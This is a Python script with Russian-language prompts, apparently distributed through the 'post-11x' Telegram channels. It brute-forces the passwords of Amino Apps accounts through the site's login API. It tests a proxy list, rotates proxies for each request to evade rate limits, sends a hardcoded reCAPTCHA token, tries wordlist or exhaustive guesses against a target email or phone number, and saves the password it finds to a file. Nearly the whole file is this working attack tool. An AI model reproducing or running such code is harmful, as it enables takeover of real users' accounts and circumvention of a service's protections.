import requests
import threading
import time
import random
import sys
import string
import os
import pyfiglet
import colorama
#Text in 3D font
out = pyfiglet.figlet_format("X.Y.I", font="slant")
try: from colorama import Fore, Back, Style
except: print('Не установлена "colorama" через pip ...'); exit()
colorama.init()
session = requests.session()
os.system('clear')

try:
    proxies = open('proxies.txt','r')
    print('[post-11x] -- > Используем прокси \'proxies.txt\'')
except:
    print('[Критическая ошибка] -- > Файл с прокси не найден \'proxies.txt\'!')
    exit()

try:
    word_list = open('words.txt','r')
    print('[post-11x] -- > Используем словарь \'words.txt\'')
except:
    print('[Критическая ошибка] -- > Не найден словарь \'words.txt\'!')
    exit()



# Count how many words there are in the words file
words_collection = word_list.readlines()
length_wordList = len(words_collection)
print('[post-11x] -- > Найдено %s слов в словаре'%str(length_wordList))

# Count how many proxies there are in the proxies file
proxy_collection = proxies.readlines()
length_proxies = len(proxy_collection)
print('[post-11x] -- > Найдено %s прокси в списке'%str(length_proxies))

global emailToUse
global authType
print(Fore.GREEN+out+Style.DIM)
print("----------------t.me/post11x----------------")
print("----------------t.me/post11x_eng------------")
authTypeTest = input('Что используем?\nИспользуй \'e\' для почты и \'p\' для номера\nВыбирай: ')
if authTypeTest.lower() == 'e':
    nameEmailOrPhoneNumber = 'Почта'
    authType = 'email'
elif authTypeTest.lower() == 'p':
    nameEmailOrPhoneNumber = 'Номер'
    authType = 'phoneNumber'
else:
    print('Неверный ввод ...')
    exit()
emailToUse = ''

print('-- > post-11x < --')
while True:
    emailToUse = input('['+str(nameEmailOrPhoneNumber)+'] :: ')
    if len(emailToUse.replace(' ','')) == 0:
        print('[Ошибка ввода] -- > выбранная почта /номер не соответсвует канону!')
    else:
        print('[post-11x] -- > Выбранная почта / номер будет использовать \'%s\''%str(emailToUse))
        break

print('\n[post-11x] -- > Начинаем проверку прокси')
time.sleep(1)

os.system('clear')

global final_proxyCollection
final_proxyCollection = []

global deadProxies
global aliveProxies

global lastProxyThread

lastProxyThread = ''

deadProxies = 0
aliveProxies = 0

def proxyTestScreen():
    clear()
    print('Активный поток: ' + str(threading.active_count()))
    print('Последний поток прокси: ' + str(globals()['lastProxyThread']))
    print('Живых прокси: ' + str(globals()['aliveProxies']))
    print('Мертвых прокси: ' + str(globals()['deadProxies']))


def testProxy (proxy):
    proxy = proxy.replace('\n','')
    _testProxy = {'http':str('http://'+str(proxy)),'https':str('http://'+str(proxy))}
    try:
        requests.get('http://www.google.com',proxies=_testProxy,timeout=2.5)
        print('Найдено живое прокси: ' + str(proxy))
        globals()['aliveProxies'] += 1
        final_proxyCollection.append(proxy)
        return {'proxy':proxy,'status':'alive'}
    except:
        print('Найдено мертвое прокси: ' +str(proxy))
        globals()['deadProxies'] += 1
        return {'proxy':proxy,'status':'dead'}


print('Проверка списка прокси листа ('+str(length_proxies)+' прокси) ...')

# Proxy Tests :
# --> Checks to see if any proxies in the proxies list are dead
# --> If they are, they will not get added into the final listing
ivari = 0
for proxy in proxy_collection:
    proxy = proxy.replace('\n','') # Remove the new line character from the proxy name (patch for previous issue)
    lastProxyThread = str(proxy)
    vars()['t'+str(ivari)] = threading.Thread(target=testProxy,args=(proxy,))
    vars()['t'+str(ivari)].start()
    ivari += 1
    time.sleep(.025)

vars()['t'+str(ivari-1)].join()


time.sleep(5)
print('\n\nПрокси проверено\n'+'-'*len('Прокси проверено'))
print('[Живые прокси] :: ' + str(aliveProxies))
print('[Мертвые прокси] :: ' + str(deadProxies))

if aliveProxies <= 2:
    if aliveProxies > 0:
        print('[Внимание] -- > Число живых прокси (%s) очень мало!\n Добавьте больше прокси для стабильной работы!')

if aliveProxies <= 0:
    os.system('clear')
    print('[Ошибка] --> Ни одно из прокси в листе не работает!\nСоветы:\n - Проверьте интернет, работает ли он\n - Есть ли у вас какие-либо прокси в листе?\n - Заблокированы ли прокси-серверы брандмауэром?\n - правильно ли отформатированы и живы прокси-серверы? Пожалуйста, убедитесь, что вы пройдете через описанные выше шаги, прежде чем пробовать что-либо еще.')
    exit()

while True:
    try: method = int(input('Метод (0 = из листа. 1 = всё подряд): ')); break
    except: print('Выбранный метод некорректен...')

print('Нажмите ENTER для начала брутфорса ...')
input()
time.sleep(1)
os.system('clear')


#print(words_collection)

correctPassword = []

def amino_pass(proxy, password,email):
    _testProxy = {'http':str('http://'+str(proxy)),'https':str('http://'+str(proxy))}
    recaptcha_version = 'v3'
    recaptcha_challenge = "03AOLTBLTAc9t-dPiTwwy6Oq2PvB0jIa-HAQjbo3Q6Grjm89PyR7SLSuDupcW1GME8mcz5KNxjhHBnrfO_dwp6F7lmNGueYECdNfWm3i0KP9EIwCqsFalQw_SOUdlZ47WTQxc35r-ufNsMijK6Kxt8AyMElk9VKM-DMWcr6Q6nwc2vACeumYh7QaC80CpTDcCcQngc8fd5ORWgJJiz_GNVYDKU2fEODHNKRhF6-enRfKPOgakANIuouV2zM3iT3rhvTe_cYRs1sfb_PPByZrWKE4p7_NNsOp4SbfqOZ8XhRigBWE3D3UZ2YMpVBaiSY0SJkiVop2hK65kWXjv2-jHVkMWUsmVYSP9dtCkpaMWAZPLD-o27XWb8TfG3mq2bHccimA4v_KkObv0DqTr9xrmjacXScybsKQms2bIne9j5GFYQw5y7l_gHLXbNcIAAAVZNU-NKttDglIVyKt0vKOTltwn73S-y8HM4fGKryaiX9jzvOBa5v57N3xXwwEWLouPyw50V1y_oGUm6"
    _jsonData = {'recaptcha_challenge':recaptcha_challenge,'recaptcha_version':recaptcha_version,'auth_type':0,'secret':password,authType:email}
    try:
        while True:
            try:
                #print('Attempt password try..')
                rQ = requests.post('https://aminoapps.com/api/auth',json=_jsonData,proxies=_testProxy,timeout=2.5)
                break
            except:
                #print(final_proxyCollection)
                #print('[Proxy Error] -- > The proxy \'%s\' timed out or failed to connect, the thread will be restarted using another proxy !'%str(proxy))
                proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
                _testProxy = {'http':str('http://'+str(proxy)),'https':str('http://'+str(proxy))}
    except:
        #print('[Proxy Error] -- > The proxy \'%s\' timed out or failed to connect and this exception loop was triggered (-1 :: Internal Error) !'%str(proxy))
        return False

    try:
        rQ.json()['result']
    except:
        #print(rQ.json())
        print('[post-11x] -- > Пароль не равен \'%s\''%str(password) + '!')

        return False

    #print(rQ.json()['result'])

    if 'nickname' in rQ.json()['result']:
        print('Пароль верен!')
        passwordFound = open('password_result.txt','w+')
        passwordFound.write(str(str(email)+':'+str(password)))
        passwordFound.close()
        print('PASSWORD = ' + str(password))
        exit()
        return True
    elif 'title' in rQ.json()['result']:
        print('\n'+'-'*32+'Пароль найден!\nПароль: ' + str(password)+'\nСсылка на проверку: ' +str(rQ.json()['result']['url'])+'\n'+'-'*32)
        os.abort()
    else:
        print('[post-11x] -- > Пароль не равен \'%s\''%str(password) + '!')
        return False

if method == 0:
    for word in words_collection:
        print('Пробую этот пароль: ' +str(word).replace('\n',''))
        word = str(word).replace('\n','')
        proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
        x = threading.Thread(target=amino_pass,args=(proxy,word,emailToUse,))

        x.start()
        time.sleep(0.075)
    time.sleep(10)
    x.join()
else:

    print('Попытка взлома пароля длинной 6 символов...')

    for y in range(0,len(list(string.printable))-1):
        for z in range(0,len(list(string.printable))-1):
            for i in range(0,len(list(string.printable))-1):
                for n in range(0,len(list(string.printable))-1):
                    for ii in range(0,len(list(string.printable))-1):
                        for yy in range(0,len(list(string.printable))-1):
                            proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
                            print('Попытка ввести пароль: '+str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n])+list(string.printable)[ii]+list(string.printable)[yy])
                            x = threading.Thread(target=amino_pass,args=(proxy,str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n]+list(string.printable)[ii]+list(string.printable)[yy]),emailToUse,))

                            x.start()
                            break
                        time.sleep(1)
                    time.sleep(2)
                time.sleep(2)
            time.sleep(2)
        time.sleep(2)

    print('Попытка взлома пароля длинной 7 символов...')

    for y in range(0,len(list(string.printable))-1):
        for z in range(0,len(list(string.printable))-1):
            for i in range(0,len(list(string.printable))-1):
                for n in range(0,len(list(string.printable))-1):
                    for ii in range(0,len(list(string.printable))-1):
                        for yy in range(0,len(list(string.printable))-1):
                            for zz in range(0,len(list(string.printable))-1):
                                proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
                                print('Попытка ввести пароль: '+str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n])+list(string.printable)[ii]+list(string.printable)[yy]+list(string.printable)[zz])
                                x = threading.Thread(target=amino_pass,args=(proxy,str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n]+list(string.printable)[ii]+list(string.printable)[yy]+list(string.printable)[zz]),emailToUse,))

                                x.start()
                                break
                            time.sleep(1)
                        time.sleep(2)
                    time.sleep(2)
                time.sleep(2)
            time.sleep(2)
        time.sleep(2)

    print('Попытка взлома пароля длинной 8 символой...')

    for y in range(0,len(list(string.printable))-1):
        for z in range(0,len(list(string.printable))-1):
            for i in range(0,len(list(string.printable))-1):
                for n in range(0,len(list(string.printable))-1):
                    for ii in range(0,len(list(string.printable))-1):
                        for yy in range(0,len(list(string.printable))-1):
                            for zz in range(0,len(list(string.printable))-1):
                                for bb in range(0,len(list(string.printable))-1):
                                    proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
                                    print('Попытка ввести пароль: '+str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n])+list(string.printable)[ii]+list(string.printable)[yy]+list(string.printable)[zz]+list(string.printable)[bb])
                                    x = threading.Thread(target=amino_pass,args=(proxy,str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n]+list(string.printable)[ii]+list(string.printable)[yy]+list(string.printable)[zz]+list(string.printable)[bb]),emailToUse,))

                                    x.start()
                                    break
                                time.sleep(1)
                            time.sleep(2)
                        time.sleep(2)
                    time.sleep(2)
                time.sleep(2)
            time.sleep(2)
        time.sleep(2)
